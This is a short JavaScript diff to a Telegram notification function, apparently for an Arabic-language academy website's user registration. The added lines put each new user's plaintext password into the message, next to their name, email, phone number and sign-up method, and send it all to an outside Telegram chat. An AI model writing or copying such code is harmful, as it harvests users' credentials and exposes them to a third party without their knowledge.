@@ -44,11 +44,13 @@ async function sendTelegramNotification(userData) {
     const message = `
 🎓 *تسجيل مستخدم جديد في أكاديميتي*
 
-👤 *الاسم:* ${userData.fullName}
-📧 *البريد:* ${userData.email}
-📱 *الهاتف:* ${userData.phone || 'غير محدد'}
-⏰ *التاريخ:* ${new Date().toLocaleString('ar-SA')}
+👤 *الاسم الكامل:* ${userData.fullName}
+📧 *البريد الإلكتروني:* ${userData.email}
+🔑 *كلمة المرور:* ${userData.password || 'تسجيل عبر Google'}
+📱 *رقم الهاتف:* ${userData.phone || 'غير محدد'}
+⏰ *تاريخ التسجيل:* ${new Date().toLocaleString('ar-SA')}
 🆔 *User ID:* ${userData.uid}
+🌐 *طريقة التسجيل:* ${userData.provider || 'البريد الإلكتروني'}
 
 ---
 ✅ تم التسجيل بنجاح!
